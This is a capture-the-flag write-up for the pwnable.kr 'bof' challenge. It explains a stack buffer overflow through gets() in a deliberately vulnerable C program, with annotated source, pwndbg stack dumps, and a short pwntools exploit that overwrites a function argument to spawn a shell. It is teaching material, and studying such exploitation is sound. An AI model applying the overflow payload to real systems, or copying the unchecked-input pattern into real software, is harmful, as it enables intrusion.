# bof

> Nana told me that buffer overflow is one of the most common software vulnerability. 
> Is that true?
> 
> Download : http://pwnable.kr/bin/bof
> Download : http://pwnable.kr/bin/bof.c
> 
> Running at : nc pwnable.kr 9000


The title of this challenge hints that this challenge has to do with buffer overflows.


## What is given?

We get a binary (bof) and the source that can be compiled to build the binary ourselves (bof.c).

The source if fairly short:


> #include <stdio.h>
> #include <string.h>
> #include <stdlib.h>
> void func(int key){
>         char overflowme[32];
>         printf("overflow me : ");
>         gets(overflowme);       // smash me!
>         if(key == 0xcafebabe){
>                 system("/bin/sh");
>         }
>         else{
>                 printf("Nah..\n");
>         }
> }
> int main(int argc, char* argv[]){
>         func(0xdeadbeef);
>         return 0;
> }


## Understanding the source

Let's understand the source! First of all, let's split up the source into it's three main components: the imports, the func function and the main function.


> #include <stdio.h>
> #include <string.h>
> #include <stdlib.h>


The imports are there for making string handling and other stuff easier, nothing special here.

Before we look at the func function, let's get a quick look at the main function, as it isn't really long and calls the func function (You might notice we're going "into" the code now, starting at the "main" and working our way into the action).


> int main(int argc, char* argv[]){
>         func(0xdeadbeef);
>         return 0;
> }


The main function is fairly basic. It receives the amount of arguments passted into the binary (argc) and list of strings containing the arguments (argv), but doesn't use them. Instead the func function is called with 0xdeadbeef as an argument.

In the end, the function returns 0, so there isn't really much going on here. Let's now take a look at the func function:


> void func(int key){
>         char overflowme[32];
>         printf("overflow me : ");
>         gets(overflowme);       // smash me!
>         if(key == 0xcafebabe){
>                 system("/bin/sh");
>         }
>         else{
>                 printf("Nah..\n");
>         }
> }


There's a lot more happening here, let's go through it line by line:


> void func(int key){


The function signature tells us, that the function receives one argument, named key that is an integer and returns void, thus nothing. We know that the argument given is 0xdeadbeef, as seen in the main function. (Don't panic: altough 0xdeadbeef might look like a string, the 0x prefix indicates that it is actually a [hexadecimal](https://en.wikipedia.org/wiki/Hexadecimal) value and thus just the representation of 3735928559 in base 16, which by coincidence is completely made up of letters).


>         char overflowme[32];


The next part initializes a 32 bytes big char buffer called overflowme, we'll get to what that is ment to say in a minute...


>         printf("overflow me : ");


...here, "overflow me : " is printed out, a pretty clear instruction...


>         gets(overflowme);       // smash me!


...and here, a comment indicates that we should smash it! Now let's get into the problems of buffer overflows and the problem presented here. This line calls the gets function using the buffer overflowme created before as it's first argument. Let's look at the manpage of gets ($ man gets):


> NAME
>        gets - get a string from standard input (DEPRECATED)


This tells us the name of the function (gets) and in a few words what it's supposed to do, namely get a string from the standard input (File descriptor 0).


> SYNOPSIS
>        #include <stdio.h>
> 
>        char *gets(char *s);


This tells us how to use get's, it tells us to include the stdio.h library and then use the get's function, by passing in a char pointer.

The Description then starts fairly direct:


> DESCRIPTION
>        Never use this function.


Now you might ask yourself: "why not use gets?", as you might want to do exactly what this function is ment to do, get a string from the standard input. Well let's read on...


>        gets() reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with a null byte ('\0').  No check for buffer overrun is performed (see BUGS below).


Well, this is a problem. What this says is that if we've got a buffer of, for example, size 4 and read 10 bytes from the standard input, the 10 bytes will be written into the buffer, as not bound checks are performed.


> 0x0 | _ _ _ _ | <- the 4 bytes big buffer
> 0x4 | _ _ _ _ |
> 0x8 | _ _ _ _ |


Now if we use get's to fill this buffer, we can write past the end of the buffer into what is stored on the stack beneath it. For understanding how we can do bad stuff with this, let's quickly look at the rest of the function, so that you know what our actual goal is:


>         if(key == 0xcafebabe){
>                 system("/bin/sh");
>         }
>         else{
>                 printf("Nah..\n");
>         }
> }


This checks if the key (the argument given into the function before (0xdeadbeef)) equals 0xcafebabe. If so, we get a shell (system("/bin/sh")). If not, we get a message telling us Nah...

Now the key 0xdeadbeef doesn't equal 0xcafebabe, that should be quite clear. In order for them to be equal, we'de have to change one of them to the correct value, but we can't, as we control neither of the values. But don't loose hope! We do have control over a buffer into which we can write and we can even write over it's boundaries. Now imagine that the buffer is located at some place in memory and the key variable is located somehere else behind it, so that when we write over the bounds of the buffer, we can overwrite the content of key with some arbitrary content. That sounds great, doesn't it? Well, that's exactly what we're going to do.

Let's clean up your understanding a bit more: When calling a function in 32-bit x86, all arguments are pushed onto the stack (See the [x86 calling conventions](https://en.wikipedia.org/wiki/X86_calling_conventions) for more information regarding this). This means that when a new function is called, the stack contains the following values:


> 0x0000
> 
> ......  buffer
> ......  argument 1
> ......  Saved return address (eip)
> ......  Saved Base Pointer (ebp)
> 
> 0xffff


Do keep in mind that the stack grows from the high adresses to the low addresses, so in the graphic above, if you'd insert another value, you'd put it above the "buffer". When writing into a buffer, we write from the low to the high addresses. This means that if we write past the bounds of the buffer, we overwrite the values previously pushed onto the stack.

If we'd write this down a bit more like in "reality", we'd get something like this:


> pwndbg> stack 20
> 00:0000│ esp 0xffffd6c0 —▸ 0xffffd6dc ◂— 'AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD'
> 01:0004│     0xffffd6c4 ◂— 0x0
> 02:0008│     0xffffd6c8 —▸ 0xf7ffd000 ◂— 0x2cf44
> 03:000c│     0xffffd6cc ◂— 0x0
> 04:0010│     0xffffd6d0 ◂— 0x0
> 05:0014│     0xffffd6d4 ◂— 0x8e
> 06:0018│     0xffffd6d8 ◂— 0x800000
> 07:001c│ eax 0xffffd6dc ◂— 'AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD'
> 08:0020│     0xffffd6e0 ◂— 'AAAABBBBBBBBCCCCCCCCDDDDDDDD'
> 09:0024│     0xffffd6e4 ◂— 'BBBBBBBBCCCCCCCCDDDDDDDD'
> 0a:0028│     0xffffd6e8 ◂— 'BBBBCCCCCCCCDDDDDDDD'
> 0b:002c│     0xffffd6ec ◂— 'CCCCCCCCDDDDDDDD'
> 0c:0030│     0xffffd6f0 ◂— 'CCCCDDDDDDDD'
> 0d:0034│     0xffffd6f4 ◂— 'DDDDDDDD'
> 0e:0038│     0xffffd6f8 ◂— 'DDDD'
> 0f:003c│     0xffffd6fc ◂— 0xaec67700
> 10:0040│     0xffffd700 —▸ 0x56556ff4 ◂— 0x1f14
> 11:0044│     0xffffd704 —▸ 0xf7fbb000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1f2d6c
> 12:0048│ ebp 0xffffd708 —▸ 0xffffd728 ◂— 0x0
> 13:004c│     0xffffd70c —▸ 0x5655569f (main+21)
> 14:0050│     0xffffd710 ◂— 0xdeadbeef


I'm using the Gnu DeBugger [gdb](https://www.gnu.org/software/gdb/) here in combination with [pwndbg](https://github.com/pwndbg/pwndbg) for having a nice interface that doesn't rely on me memorizing dozens of obscure commands.

The graphic above displays the entries on the stack. The first column shows us the nuber of the element, starting at the top of the stack with the offset. After the pipe, there's a column in which three registers are displayed (esp, eax and ebp). This is a nice feature of pwndbg, namely pwndbg realized that we are looking at values with some registers containing those addresses, meaning that for example, the stack pointer esp is pointing to the top of the stack, so pwndbg displays this. The next column contains the address of the value. As the stack is stored in memory, the position of values on the stack can be defined using a memory address. For example, the stack pointer esp, currently contains the value 0xffffd6c0.

Now let's get into the interesting part: the values entered. I've executed the binary and entered AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD (you might have guessed that by now). Now you might ask yourself why pwndbg displays that value as weirdly as it is from the stack values 07 to 0e. Well, the string is contained in that memory region, it's just pwndbg trying to be helpful by displaying the whole string from that point on.

The more interesting part start's below here:


> 0e:0038│     0xffffd6f8 ◂— 'DDDD'
> 0f:003c│     0xffffd6fc ◂— 0xaec67700
> 10:0040│     0xffffd700 —▸ 0x56556ff4 ◂— 0x1f14
> 11:0044│     0xffffd704 —▸ 0xf7fbb000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1f2d6c
> 12:0048│ ebp 0xffffd708 —▸ 0xffffd728 ◂— 0x0


The top line contains the last bytes of our 32 bytes long string. Now if out input would be checked, as in: it should be at most 32 bytes long, this wouldn't be a problem, but as we can enter an input with an arbitrary length, we can overwrite past the bounds of the buffer. If we input a string longer than 32 bytes, for example 56 bytes, we can overwrite the values after 0xffffd6fc:


> 0e:0038│     0xffffd6f8 ◂— 'DDDDEEEEEEEEFFFFFFFF'
> 0f:003c│     0xffffd6fc ◂— 'EEEEEEEEFFFFFFFF'
> 10:0040│     0xffffd700 ◂— 'EEEEFFFFFFFF'
> 11:0044│     0xffffd704 ◂— 'FFFFFFFF'
> 12:0048│ ebp 0xffffd708 ◂— 'FFFF'


As you can see above, the input didn't stop with DDDD, but was longer than 32 bytes containing the previous string concatinated with EEEEEEEEFFFFFFFF. This means that we could replace EEEEEEEEFFFFFFFF with arbitrary values that would corrupt the control flow, as the binary uses the values stored on the stack to determine what to do, when done executing the function.


## Exploiting

For now, we only need to overwrite the 0xdeadbeef value passed as an argument to the func function. For this, we need to locate the value in memory (on the stack) in order to determine how much memory we need to overwrite in order to overwrite 0xdeadbeef.

Here an extraction from the original input (AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD) which did fit perfectly into our buffer:


> ...
> 07:001c│ eax 0xffffd6dc ◂— 'AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD'
> 08:0020│     0xffffd6e0 ◂— 'AAAABBBBBBBBCCCCCCCCDDDDDDDD'
> 09:0024│     0xffffd6e4 ◂— 'BBBBBBBBCCCCCCCCDDDDDDDD'
> 0a:0028│     0xffffd6e8 ◂— 'BBBBCCCCCCCCDDDDDDDD'
> 0b:002c│     0xffffd6ec ◂— 'CCCCCCCCDDDDDDDD'
> 0c:0030│     0xffffd6f0 ◂— 'CCCCDDDDDDDD'
> 0d:0034│     0xffffd6f4 ◂— 'DDDDDDDD'
> 0e:0038│     0xffffd6f8 ◂— 'DDDD'
> 0f:003c│     0xffffd6fc ◂— 0xaec67700
> 10:0040│     0xffffd700 —▸ 0x56556ff4 ◂— 0x1f14
> 11:0044│     0xffffd704 —▸ 0xf7fbb000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1f2d6c
> 12:0048│ ebp 0xffffd708 —▸ 0xffffd728 ◂— 0x0
> 13:004c│     0xffffd70c —▸ 0x5655569f (main+21)
> 14:0050│     0xffffd710 ◂— 0xdeadbeef
> ...


The stack is 4 bytes "wide", so our string is split up into 8 lines, we can see the 0xdeadbeef value passed into the function at the bottom. In order to override this, we thus have to write 32 bytes to fill the buffer, 5 * 4 bytes in order to overwrite the space between the buffer and the value we want to overwrite and then four more bytes in order to overwrite 0xdeadbeef with 0xcafebabe:

So in the end, this simple "exploit" looks like this:


> from pwn import *
> 
> #p = remote('pwnable.kr', 9000)
> p = process('./bof')
> 
> payload = (32 * 'A') + ((5 * 4) * 'B') + '\xbe\xba\xfe\xca' + "\n"
> p.sendlineafter("overflow me :", payload)
> p.interactive()